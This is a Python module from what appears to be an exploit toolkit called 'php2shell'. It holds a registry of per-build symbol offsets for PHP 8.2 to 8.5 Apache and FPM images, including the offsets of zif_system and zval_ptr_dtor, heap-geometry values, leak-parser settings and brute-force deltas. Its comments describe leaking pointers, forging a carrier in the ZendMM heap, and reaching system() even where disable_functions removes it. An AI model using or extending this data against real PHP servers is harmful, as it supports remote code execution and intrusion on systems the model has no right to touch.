"""Per-build profile registry — offsets + heap geometry, one row per build.

The core chain is per-build: `zif_system` / `zval_ptr_dtor` are ASLR-independent
symbol offsets, but the *heap geometry* (`MAIN_BUCKET_COUNT`, `S_OFF`,
`LEAK_SPEC`, stage paddings) is layout-dependent and must be calibrated per
build (see `docs/OFFSETS.md` and `php2shell/calibrate.py`).

A profile has two layers:

  symbols   identity + `zval_ptr_dtor` / `zif_system` / `zif_passthru`
  leak      what the in-band leak parser needs: `dtor_offset` (the value the
            leaked qword carries, which on aarch64 is symbol+bias), the user
            pointer window, the libphp<->chunk delta window, and the geometry
            (`main_bucket_count`, `s_off`, `fake_len`, `leak_spec`).

`profiles/*.json` (written by `php2shell/offsets.py` /
`php2shell/calibrate.py`) override the builtin table; the builtin table is the
documented, offline-checkable baseline.
"""

from __future__ import annotations

import json
from pathlib import Path

PROFILE_DIR = Path(__file__).resolve().parent.parent / "profiles"

# Arch-level defaults: pointer window, libphp<->chunk distance window, and the
# bias between the leaked destructor qword and the symbol offset.
ARCH_DEFAULTS = {
    "x86_64": {
        "ptr_max": 0x7FFFFFFFFFFFFFFF,
        # libphp<->main-chunk distance is build/config dependent (8.4.10 is
        # ~0x260000, 8.4.25 ~0x21d0000). The candidate list is sorted by the
        # 87-pointer fingerprint, so this window is a sanity bound, not the
        # selector; keep it wide.
        "delta_min": 0x100000,
        "delta_max": 0x8000000,
        "leak_bias": 0x0,
    },
    "aarch64": {
        "ptr_max": 0xFFFFFFFFFFFF,
        "delta_min": 0x100000,
        "delta_max": 0x8000000,
        "leak_bias": 0xB,
    },
}

# Default heap geometry: the published 9bie shape, validated on 8.4.26.
DEFAULT_GEOMETRY = {
    "main_bucket_count": 87,
    "s_off": 0xF8398,
    "fake_len": 0xC8000,
    "leak_spec": ",".join(
        ["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"]
    ),
}

# Plan B (var_destroy): fresh-worker ZendMM `main` chunk -> forged carrier.
# Measured with the reset-worker sequence in verify_vardestroy_inband.py /
# verify_vardestroy_lfi.py. Keyed by (php_version, arch); `None` means "not
# calibrated for this build" -- the shim must not invent a value.
VD_CARRIER_DELTA = {
    ("8.4.26", "aarch64"): 0x6A018,
    ("8.4.27", "aarch64"): 0x6A018,
    ("8.5.12", "aarch64"): 0x7B018,
    # 8.2/8.3 (measured 2026-10-30; post-crash fresh worker). Cold start is
    # 0x59018 and warm-after-graceful is 0x6E018; the brute force always fires
    # after a kill, so 0x6D018 is the profile value.
    ("8.2.34", "aarch64"): 0x6D018,
    ("8.3.35", "aarch64"): 0x6D018,
}

# Plan B under PHP-FPM: the stripped `php-fpm` binary has no `zif_system`
# symbol, and a pool that sets disable_functions=system removes the function
# from the worker's function table. The handler is then reached by a fixed
# offset from the fpm text base. Keyed by (php_version, arch); None = unknown.
ZIF_FPM_OFFSET = {
    ("8.4.27", "aarch64"): 0x424C70,
}

# Plan B brute force: main -> libphp base. libphp is allocated by dlopen in a
# 2 MiB slot relative to the ZendMM main chunk; only the 64 KiB position (j)
# inside that slot varies. Measured 2026-10-30: 8.4.x lib sits in the slot
# above main (32 positions); 8.5.12 lib sits below main (2 positions).
# Stateful carrier deltas (post-crash, warm-after-graceful, cold). The first
# entry is the profile value used by full scans; leak-seeded fire tries all.
VD_CARRIER_DELTAS = {
    ("8.4.26", "aarch64"): [0x6A018],
    ("8.4.27", "aarch64"): [0x6A018],
    ("8.5.12", "aarch64"): [0x7B018],
    ("8.2.34", "aarch64"): [0x6D018, 0x6E018, 0x59018],
    ("8.3.35", "aarch64"): [0x6D018, 0x6E018, 0x59018],
}

VD_LIB_DELTAS = {
    ("8.4.26", "aarch64"): [0x2000000 + j * 0x10000 for j in range(33)],
    ("8.4.27", "aarch64"): [0x2000000 + j * 0x10000 for j in range(33)],
    ("8.5.12", "aarch64"): [-0x3400000, -0x3600000],
    ("8.2.34", "aarch64"): [0x2000000 + j * 0x10000 for j in range(1, 33)],
    ("8.3.35", "aarch64"): [0x2000000 + j * 0x10000 for j in range(1, 33)],
}


# Builtin symbol table. `zval_ptr_dtor` / `zif_system` are symbol offsets read
# with readelf; `leak_dtor` is the value the leaked qword carries.
BUILTINS = {
    # ---- amd64 (docs/OFFSETS.md) ----
    "php-8.4.26-bookworm-x86_64": {
        "image": "php:8.4.26-apache", "php_version": "8.4.26",
        "arch": "x86_64", "validated": True,
        "zval_ptr_dtor": 0x65EB60, "zif_system": 0x465370,
        "zif_passthru": 0x465380, "leak_dtor": 0x65EB60,
    },
    "php-8.5.11-bookworm-x86_64": {
        "image": "php:8.5.11-apache", "php_version": "8.5.11",
        "arch": "x86_64", "validated": False,
        "zval_ptr_dtor": 0x7B47A0, "zif_system": 0x5996E0,
        "zif_passthru": 0x5996F0, "leak_dtor": 0x7B47A0,
    },
    "php-8.3.35-bookworm-x86_64": {
        "image": "php:8.3.35-apache", "php_version": "8.3.35",
        "arch": "x86_64", "validated": False,
        "zval_ptr_dtor": 0x49EC50, "zif_system": 0x3AC080,
        "zif_passthru": 0x3AC090, "leak_dtor": 0x49EC50,
    },
    "php-8.2.34-bookworm-x86_64": {
        "image": "php:8.2.34-apache", "php_version": "8.2.34",
        "arch": "x86_64", "validated": False,
        "zval_ptr_dtor": 0x487650, "zif_system": 0x39B8A0,
        "zif_passthru": 0x39B8B0, "leak_dtor": 0x487650,
    },
    # ---- aarch64 (docs/OFFSETS.md, php2shell/leak.py) ----
    "php-8.4.26-bookworm-aarch64": {
        "image": "php:8.4.26-apache", "php_version": "8.4.26",
        "arch": "aarch64", "validated": True,
        "zval_ptr_dtor": 0x638120, "zif_system": 0x42CD70,
        "zif_passthru": 0x42CD80, "leak_dtor": 0x63812B,
    },
    "php-8.5.11-bookworm-aarch64": {
        "image": "php:8.5.11-apache", "php_version": "8.5.11",
        "arch": "aarch64", "validated": False,
        "zval_ptr_dtor": 0x761B80, "zif_system": 0x5314F0,
        "zif_passthru": 0x531500, "leak_dtor": 0x761B80,
    },
    "php-8.5.10-bookworm-aarch64": {
        "image": "php:8.5.10-apache", "php_version": "8.5.10",
        "arch": "aarch64", "validated": False,
        "zval_ptr_dtor": 0x75D360, "zif_system": 0x52E130,
        "zif_passthru": None, "leak_dtor": 0x75D360,
    },
    "php-8.5.0-bookworm-aarch64": {
        "image": "php:8.5.0-apache", "php_version": "8.5.0",
        "arch": "aarch64", "validated": False,
        "zval_ptr_dtor": 0x731D80, "zif_system": 0x503510,
        "zif_passthru": None, "leak_dtor": 0x731D80,
    },
    "php-8.4.25-bookworm-aarch64": {
        "image": "php:8.4.25-apache", "php_version": "8.4.25",
        "arch": "aarch64", "validated": False,
        "zval_ptr_dtor": 0x637AE0, "zif_system": 0x42FA30,
        "zif_passthru": None, "leak_dtor": 0x637AE0,
    },
    "php-8.3.35-bookworm-aarch64": {
        "image": "php:8.3.35-apache", "php_version": "8.3.35",
        "arch": "aarch64", "validated": False,
        "zval_ptr_dtor": 0x46FCC0, "zif_system": 0x377428,
        "zif_passthru": None, "leak_dtor": 0x46FCC0,
    },
    "php-8.2.34-bookworm-aarch64": {
        "image": "php:8.2.34-apache", "php_version": "8.2.34",
        "arch": "aarch64", "validated": False,
        "zval_ptr_dtor": 0x4606C0, "zif_system": 0x36FF48,
        "zif_passthru": None, "leak_dtor": 0x4606C0,
    },
    "php-8.2.0-bookworm-aarch64": {
        "image": "php:8.2.0-apache", "php_version": "8.2.0",
        "arch": "aarch64", "validated": False,
        "zval_ptr_dtor": 0x4520C0, "zif_system": 0x364F30,
        "zif_passthru": None, "leak_dtor": 0x4520C0,
    },
}


def _normalize(profile):
    """Fill a profile's runtime fields (arch defaults + geometry)."""
    out = dict(profile)
    arch = out.get("arch", "x86_64")
    defaults = ARCH_DEFAULTS.get(arch, ARCH_DEFAULTS["x86_64"])
    for k, v in defaults.items():
        out.setdefault(k, v)
    for k, v in DEFAULT_GEOMETRY.items():
        out.setdefault(k, v)
    # A calibrated profile can override the leak-side destructor offset; the
    # symbol offset remains authoritative for tooling.
    out.setdefault("leak_dtor", out.get("zval_ptr_dtor", 0))
    out["dtor_offset"] = out["leak_dtor"]
    out["zif_offset"] = out["zif_system"]
    # Geometry is the default 9bie shape unless a row was calibrated against
    # this build; a validated build has necessarily been calibrated.
    if "geometry_calibrated" not in out:
        out["geometry_calibrated"] = bool(out.get("validated"))
    # Plan B fresh-worker carrier offset (main -> forged carrier). Not every
    # build is calibrated; a missing row stays None rather than guessing.
    if "vd_carrier_delta" not in out:
        out["vd_carrier_delta"] = VD_CARRIER_DELTA.get(
            (str(out.get("php_version")), out.get("arch")))
    if "zif_system_fpm" not in out:
        out["zif_system_fpm"] = ZIF_FPM_OFFSET.get(
            (str(out.get("php_version")), out.get("arch")))
    if "vd_carrier_deltas" not in out:
        out["vd_carrier_deltas"] = VD_CARRIER_DELTAS.get(
            (str(out.get("php_version")), out.get("arch")))
    if "vd_lib_deltas" not in out:
        out["vd_lib_deltas"] = VD_LIB_DELTAS.get(
            (str(out.get("php_version")), out.get("arch")))
    return out


def load(include_files=True):
    """Return {profile_id: normalized profile}."""
    table = {pid: _normalize(p) for pid, p in BUILTINS.items()}
    if include_files and PROFILE_DIR.is_dir():
        for path in sorted(PROFILE_DIR.glob("*.json")):
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
            except (OSError, ValueError):
                continue
            items = data.get("profiles", data) if isinstance(data, dict) else {}
            if not isinstance(items, dict):
                continue
            for pid, prof in items.items():
                if not isinstance(prof, dict):
                    continue
                # An extracted row must not downgrade a validated build.
                prior = table.get(pid, {})
                merged = dict(prior)
                merged.update(prof)
                if prior.get("validated"):
                    merged["validated"] = True
                if prior.get("geometry_calibrated"):
                    merged["geometry_calibrated"] = True
                table[pid] = _normalize(merged)
    return table


def list_builds(arch=None, php_version=None):
    table = load()
    rows = sorted(table.values(), key=lambda p: (p.get("arch", ""),
                                                 p.get("php_version", "")))
    if arch:
        rows = [p for p in rows if p.get("arch") == arch]
    if php_version:
        rows = [p for p in rows if p.get("php_version") == php_version]
    return rows


def for_arch(arch):
    """Arch-level default runtime profile (used when no build is known)."""
    if arch not in ARCH_DEFAULTS:
        raise KeyError(f"unknown arch {arch!r}; expected {sorted(ARCH_DEFAULTS)}")
    # Prefer a validated build for that arch, so geometry/offsets match.
    for prof in load().values():
        if prof.get("arch") == arch and prof.get("validated"):
            return prof
    for prof in load().values():
        if prof.get("arch") == arch:
            return prof
    stub = {"arch": arch, "dtor_offset": 0, "zif_offset": 0}
    return _normalize(stub)


def find(php_version=None, arch=None, image=None, build_id=None,
         sha256=None):
    """Look up the best profile. Returns None when nothing matches."""
    table = load()
    if build_id:
        for prof in table.values():
            if prof.get("build_id") == build_id:
                return prof
    if sha256:
        for prof in table.values():
            if prof.get("libphp_sha256") == sha256:
                return prof
    if image:
        for prof in table.values():
            if prof.get("image") == image and (not arch or prof.get("arch") == arch):
                return prof
    if php_version:
        for prof in table.values():
            if prof.get("php_version") == php_version and (
                    not arch or prof.get("arch") == arch):
                return prof
    return None


def runtime(profile):
    """Flatten a profile into the keys `remote` consumes.

    `dtor_offsets` is a candidate list: on some builds the leaked qword is the
    plain `zval_ptr_dtor` symbol, on others it is the symbol plus a small
    per-build bias (e.g. 8.4.26 aarch64 `+0xB`). The leak parser picks the
    candidate that yields a page-aligned libphp base.
    """
    p = _normalize(profile or {})
    arch = p.get("arch", "x86_64")
    cands = []
    for off in (p["zval_ptr_dtor"], p.get("leak_dtor"),
                p.get("leak_dtor_biased")):
        if isinstance(off, int) and off and off not in cands:
            cands.append(off)
    bias = ARCH_DEFAULTS.get(arch, {}).get("leak_bias", 0)
    for off in (p["zval_ptr_dtor"] + bias,):
        if off not in cands:
            cands.append(off)
    return {
        "id": p.get("id"),
        "arch": p.get("arch"),
        "dtor_offsets": cands,
        "dtor_offset": p["dtor_offset"],
        "zif_offset": p["zif_offset"],
        "ptr_max": p["ptr_max"],
        "delta_min": p["delta_min"],
        "delta_max": p["delta_max"],
        "main_bucket_count": p["main_bucket_count"],
        "s_off": p["s_off"],
        "fake_len": p["fake_len"],
        "leak_spec": p["leak_spec"],
    }
